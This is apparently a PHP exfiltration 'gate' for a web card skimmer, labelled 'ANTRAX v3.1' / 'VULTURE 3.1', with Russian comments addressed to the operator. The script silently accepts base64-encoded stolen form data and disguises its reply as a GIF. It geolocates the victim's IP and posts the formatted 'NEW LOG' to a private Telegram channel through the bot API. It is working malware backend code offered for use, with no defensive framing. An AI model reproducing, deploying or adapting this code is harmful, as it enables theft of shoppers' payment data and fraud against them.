<?php
// ANTRAX v3.1 - Silent Exfiltration Gate
// No logs, no files, no trace.

// --- CONFIGURATION ---
$botToken = '7182...YOUR_BOT_TOKEN_HERE...3a9Y'; // Твой токен бота
$chatId = '-100...YOUR_CHANNEL_ID_HERE...591';   // ID твоего приватного канала
// ---------------------

// Немедленно обрываем соединение с жертвой, чтобы скиммер не ждал ответа.
ob_start();
header('Connection: close');
header('Content-Length: ' . ob_get_length());
header('Content-Type: image/gif');
ob_end_flush();
ob_flush();
flush();

// Основная логика выполняется ПОСЛЕ отправки ответа браузеру.
if (isset($_GET['d'])) {
    $data = base64_decode($_GET['d']);
    $logData = json_decode($data, true);

    if ($logData && is_array($logData)) {
        // Собираем детальную информацию о жертве
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $timestamp = date('Y-m-d H:i:s');
        
        // Используем API для получения информации по IP (не обязательно, но полезно)
        $ipInfo = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
        $country = $ipInfo['country'] ?? 'Unknown';
        $city = $ipInfo['city'] ?? 'Unknown';
        $isp = $ipInfo['isp'] ?? 'Unknown';

        // Формируем красивое сообщение для Telegram
        $message = "<b>💳 NEW LOG | VULTURE 3.1 💳</b>\n\n";
        $message .= "<b>Time:</b> <code>" . $timestamp . "</code>\n";
        $message .= "<b>Domain:</b> <code>" . ($logData['domain'] ?? 'N/A') . "</code>\n";
        $message .= "<b>IP:</b> <code>" . $ip . "</code> (".$country.", ".$city.")\n";
        $message .= "<b>ISP:</b> <code>" . $isp . "</code>\n";
        $message .= "<b>User-Agent:</b> <code>" . $userAgent . "</code>\n\n";
        $message .= "<pre>" . htmlspecialchars(json_encode($logData, JSON_PRETTY_PRINT)) . "</pre>";

        // Отправка в Telegram через cURL
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/sendMessage");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML'
        ]));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Не ждем долго
        curl_exec($ch);
        curl_close($ch);
    }
}
// Ничего не выводим, соединение уже закрыто.
exit();
